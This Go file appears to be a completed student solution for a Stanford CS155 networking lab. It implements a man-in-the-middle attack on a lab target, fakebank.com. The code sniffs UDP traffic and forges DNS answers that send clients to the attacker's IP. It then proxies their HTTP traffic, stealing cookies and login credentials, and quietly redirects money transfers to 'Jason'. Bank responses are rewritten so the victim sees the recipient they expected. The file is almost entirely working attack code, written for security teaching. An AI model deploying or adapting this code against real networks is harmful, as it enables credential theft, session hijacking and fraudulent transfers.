/*
 * Stanford CS155 Project 3 Networking Part 4. Monster-in-the-Middle Attack
 *
 * mitm.go When completed (by you!) and compiled, this program will:
 *
 * * Intercept and spoof DNS questions for fakebank.com to instead direct the
 *   client towards the attacker's IP.
 *
 * * Act as an HTTP proxy, relaying the client's requests to fakebank.com and
 *   sending fakebank.com's response back to the client... but with an evil
 *   twist.
 *
 *
 */


package main

// These are the imports we used, but feel free to use anything from gopacket
// or the Go standard libraries. YOU MAY NOT import other third-party
// libraries, as your code may fail to compile on the autograder.
import (
	"bytes"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"syscall"

	cs155 "fakebank.com/mitm/network" // For `cs155.*` methods
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// ==============================
//  DNS MITM PORTION
// ==============================

func startDNSServer() {
	handle, err := pcap.OpenLive("eth0", 1600, true, pcap.BlockForever)
	if err != nil {
		log.Panic(err)
	}
	if err := handle.SetBPFFilter("udp"); err != nil { // only grab UDP packets
		// More on BPF filtering:
		// https://www.ibm.com/support/knowledgecenter/SS42VS_7.4.0/com.ibm.qradar.doc/c_forensics_bpf.html
		log.Panic(err)
	} else {
		// close PCAP connection when program exits
		defer handle.Close()
		// Loop over each UDP packet received
		// Note: This will iterate over _all_ UDP packets.
		// Not all are guaranteed to be DNS packets.
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for pkt := range packetSource.Packets() {
			handleUDPPacket(pkt)
		}
	}
}

/*
	handleUDPPacket detects DNS packets and sends a spoofed DNS response as appropriate.

	Parameters: packet, a packet captured on the network, which may or may not be DNS.
*/
func handleUDPPacket(packet gopacket.Packet) {

	// Due to the BPF filter set in main(), we can assume a UDP layer is present.
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer == nil {
		panic("unable to decode IP layer")

	}

	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer == nil {
		panic("unable to decode UDP packet")
	}

	// Manually extract the payload of the UDP layer and parse it as DNS.
	payload := udpLayer.(*layers.UDP).Payload
	dnsPacketObj := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default)

	// Check if the UDP packet contains a DNS packet within. Do nothing for non-DNS UDP packets
	if dnsLayer := dnsPacketObj.Layer(layers.LayerTypeDNS); dnsLayer != nil {
		// Type-switch the layer to the correct interface in order to operate on its member variables.

		dns, _ := dnsLayer.(*layers.DNS)

		// TODO #1: When the client queries fakebank.com, send a spoofed response.
		//          (use dnsIntercept, spoofDNS, and sendRawUDP where necessary)
		//
		// Hint:    Parse dnsData, then search for an exact match of "fakebank.com". To do
		//          this, you may have to index into an array; make sure its
		//          length is non-zero before doing so!
		//
		// Hint:    In addition, you don't want to respond to your spoofed
		//          response as it travels over the network, so check that the
		//          DNS packet has no answer (also stored in an array).
		//
		// Hint:    Because the payload variable above is a []byte, you may find
		//          this line of code useful when calling spoofDNS, since it requires
		//          a gopacket.Payload type: castPayload := gopacket.Payload(payload)
		if dns.Questions == nil || len(dns.Questions) == 0 {
			panic("unable to extract destination domain name of DNS packet")
		}

		if string(dns.Questions[0].Name) == "fakebank.com" && len(dns.Answers) == 0 {
			ip, _ := ipLayer.(*layers.IPv4)
			udp, _ := udpLayer.(*layers.UDP)
			intercept := dnsIntercept{ip.SrcIP, udp.SrcPort, ip.DstIP, udp.DstPort}
			castPayload := gopacket.Payload(payload)
			spoofDNS(intercept, castPayload)
		}

	}
}

/*
	dnsIntercept stores the pertinent information from a captured DNS packet
	in order to craft a response in spoofDNS.
*/

// TODO #2: Determine what needs to be intercepted from the DNS request
//          for fakebank.com in order to craft a spoofed answer.
type dnsIntercept struct {
	clientIP   net.IP
	clientPort layers.UDPPort
	destIP     net.IP
	destPort   layers.UDPPort
}

/*
	spoofDNS is called by handleUDPPacket upon detection of a DNS request for
	"fakebank.com". Your goal is to make a packet that seems like it came from the
	genuine DNS server, but instead lies to the client that fakebank.com is at the
	attacker's IP address.

	Parameters:

	  - intercept, a struct containing information from the original DNS request
	    packet

	  - payload, the application (DNS) layer from the original DNS request

	Returns: the spoofed DNS answer packet as a slice of bytes
*/
func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
	// In order to make a packet containing the spoofed DNS answer, we need
	// to start from layer 3 of the OSI model (IP) and work upwards, filling
	// in the headers of the IP, UDP, and finally DNS layers.

	// TODO #3: Fill in the missing fields below to construct the base layers of
	//          your spoofed DNS packet. If you are confused about what the Protocol
	//          variable means, Google and IANA are your friends!

	ip := &layers.IPv4{
		// fakebank.com operates on IPv4 exclusively.
		Version:  4,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    intercept.destIP,
		DstIP:    intercept.clientIP,
	}

	udp := &layers.UDP{
		SrcPort: intercept.destPort,
		DstPort: intercept.clientPort,
	}

	// The checksum for the level 4 header (which includes UDP) depends on
	// what level 3 protocol encapsulates it; let UDP know it will be wrapped
	// inside IPv4.
	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
		log.Panic(err)
	}
	// As long as payload contains DNS layer data, we can convert the
	// sequence of bytes into a DNS data structure.
	dnsPacket := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default).Layer(layers.LayerTypeDNS)
	dns, ok := dnsPacket.(*layers.DNS)
	if !ok {
		log.Panic("Tried to spoof a packet that doesn't appear to have a DNS layer.")
	}

	// TODO #4: Populate the DNS layer (dns) with your answer that points to the attack web server
	//          Your business-minded friends may have dropped some hints elsewhere in the network!
	// attackerIP := net.ParseIP(cs155.GetBankIP())
	attackerIP, _, _ := net.ParseCIDR(cs155.GetLocalIP())
	var dnsAnswer layers.DNSResourceRecord
	dnsAnswer.Type = layers.DNSTypeA
	dnsAnswer.IP = attackerIP
	dnsAnswer.Name = []byte("fakebank.com")
	dnsAnswer.Class = layers.DNSClassIN

	dns.QR = true
	dns.ANCount = 1
	dns.ResponseCode = layers.DNSResponseCodeNoErr
	dns.Answers = append(dns.Answers, dnsAnswer)

	// Now we're ready to seal off and send the packet.
	// Serialization refers to "flattening" a packet's different layers into a
	// raw stream of bytes to be sent over the network.
	// Here, we want to automatically populate length and checksum fields with the correct values.
	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	buf := gopacket.NewSerializeBuffer()

	if err := gopacket.SerializeLayers(buf, serializeOpts, ip, udp, dns); err != nil {
		log.Panic(err)
	}
	sendRawUDP(int(intercept.clientPort), []byte(intercept.clientIP), buf.Bytes())
	return buf.Bytes()
}

/*
	sendRawUDP is a helper function that sends bytes over UDP to the target host/port
	combination.

	Parameters:
	- port, the destination port.
	- dest, destination IP address.
	- toSend - the raw packet to send over the wire.

	Returns: None

*/
func sendRawUDP(port int, dest []byte, toSend []byte) {
	// Opens an IPv4 socket to destination host/port.
	outFD, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW,
		syscall.IPPROTO_RAW)
	var destArr [4]byte
	copy(destArr[:], dest)
	addr := syscall.SockaddrInet4{
		Port: port,
		Addr: destArr,
	}
	if err := syscall.Sendto(outFD, toSend, 0, &addr); err != nil {
		log.Panic(err)
	}
	if err := syscall.Close(outFD); err != nil {
		log.Panic(err)
	}
}

// ==============================
//  HTTP MITM PORTION
// ==============================

/*
	startHTTPServer sets up a simple HTTP server to masquerade as fakebank.com, once DNS spoofing is successful.
*/
func startHTTPServer() {
	http.HandleFunc("/", handleHTTP)
	log.Panic(http.ListenAndServe(":80", nil))
}

/*
	handleHTTP is called every time an HTTP request arrives and handles the backdoor
	connection to the real fakebank.com.

	Parameters:
	- rw, a "return envelope" for data to be sent back to the client;
	- r, an incoming message from the client
*/
func handleHTTP(rw http.ResponseWriter, r *http.Request) {

	if r.URL.Path == "/kill" {
		os.Exit(1)
	}

	// TODO #5: Handle HTTP requests. Roughly speaking, you should delegate most of the work to
	//          SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
	//          and use this function for the more general tasks that remain, like stealing cookies
	//          and actually communicating over the network.
	//
	// Hint:    You will want to create an http.Client object to deliver the spoofed
	//          HTTP request, and to capture the real fakebank.com's response.
	//
	// Hint:    Make sure to check for cookies in both the request and response!

	bankRequest := spoofBankRequest(r)
	bankRequestCookies := r.Cookies()
	for _, cookie := range bankRequestCookies {
		cs155.StealClientCookie(cookie.Name, cookie.Value)
	}

	client := &http.Client{}
	bankResponse, _ := client.Do(bankRequest)
	bankResponseCookie := bankResponse.Cookies()
	for _, cookie := range bankResponseCookie {
		cs155.StealServerCookie(cookie.Name, cookie.Value)
	}
	writeClientResponse(bankResponse, r, &rw)
}

/*
	spoofBankRequest creates the request that is actually sent to fakebank.com.

	Parameters:
	- origRequest, the request received from the bank client.

	Returns: The spoofed packet, ready to be sent to fakebank.com.
*/
func spoofBankRequest(origRequest *http.Request) *http.Request {
	var bankRequest *http.Request
	var bankURL = "http://" + cs155.GetBankIP() + origRequest.RequestURI

	if origRequest.URL.Path == "/login" {

		// TODO #6: Since the client is logging in,
		//          - parse the request's form data,
		//          - steal the credentials,
		//          - make a new request, leaving the values untouched
		//
		// Hint:    Once you parse the form (Google is your friend!), the form
		//          becomes a url.Values object. As a consequence, you cannot
		//          simply reuse origRequest, and must make a new request.
		//          However, url.Values supports member functions Get(), Set(),
		//          and Encode(). Encode() URL-encodes the form data into a string.
		//
		// Hint:    http.NewRequest()'s third parameter, body, is an io.Reader object.
		//          You can wrap the URL-encoded form data into a Reader with the
		//          strings.NewReader() function.

		origRequest.ParseForm()
		loginForm := origRequest.Form
		cs155.StealCredentials(loginForm.Get("username"), loginForm.Get("password"))
		bankRequest, _ = http.NewRequest("POST", bankURL, strings.NewReader(loginForm.Encode()))

	} else if origRequest.URL.Path == "/logout" {

		// Since the client is just logging out, don't do anything major here
		bankRequest, _ = http.NewRequest("POST", bankURL, nil)

	} else if origRequest.URL.Path == "/transfer" {

		// TODO #7: Since the client is transferring money,
		//			- parse the request's form data
		//          - if the form has a key named "to", modify it to "Jason"
		//          - make a new request with the updated form values
		origRequest.ParseForm()
		transferForm := origRequest.Form
		transferTo := transferForm.Get("to")
		transferForm.Set("to", "Jason")
		bankRequest, _ = http.NewRequest("POST", bankURL, strings.NewReader(transferForm.Encode()))
		transferForm.Set("to", transferTo)
	} else {
		// Silently pass-through any unidentified requests
		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, origRequest.Body)
	}

	// Also pass-through the same headers originally provided by the client.
	bankRequest.Header = origRequest.Header
	return bankRequest
}

/*
	writeClientResponse forms the HTTP response to the client, making in-place modifications
	to the response received from the real fakebank.com.

	Parameters:
	- bankResponse, the response from the bank
	- origRequest, the original request from the client
	- writer, the interface where the response is constructed

	Returns: the same ResponseWriter that was provided (for daisy-chaining, if needed)
*/
func writeClientResponse(bankResponse *http.Response, origRequest *http.Request, writer *http.ResponseWriter) *http.ResponseWriter {

	// Pass any cookies set by fakebank.com on to the client.
	if len(bankResponse.Cookies()) != 0 {
		for _, cookie := range bankResponse.Cookies() {
			http.SetCookie(*writer, cookie)
		}
	}

	if origRequest.URL.Path == "/transfer" {

		// TODO #8: Use the original request to change the recipient back to the
		//          value expected by the client.
		//
		// Hint:    Unlike an http.Request object which uses an io.Reader object
		//          as the body, the body of an http.Response object is an io.ReadCloser.
		//          ioutil.ReadAll() takes an io.ReadCloser and outputs []byte.
		//          ioutil.NopCloser() takes an io.Reader and outputs io.ReadCloser.
		//	    strings.ReplaceAll() replaces occurrences of substrings in string.
		//	    You can convert between []bytes and strings via string() and []byte.
		//
		// Hint:    bytes.NewReader() is analogous to strings.NewReader() in the
		//          /login endpoint, where you could wrap a string in an io.Reader.
		origRequest.ParseForm()
		transferForm := origRequest.Form
		body, _ := ioutil.ReadAll(bankResponse.Body)
		newBody := strings.ReplaceAll(string(body), "Jason", transferForm.Get("to"))
		bankResponse.Body = ioutil.NopCloser(bytes.NewReader([]byte(newBody)))
	}

	// Now that all changes are complete, write the body
	if _, err := io.Copy(*writer, bankResponse.Body); err != nil {
		log.Fatal(err)
	}

	return writer
}

func main() {

	// The DNS server is run concurrently as a goroutine
	go startDNSServer()

	startHTTPServer()
}
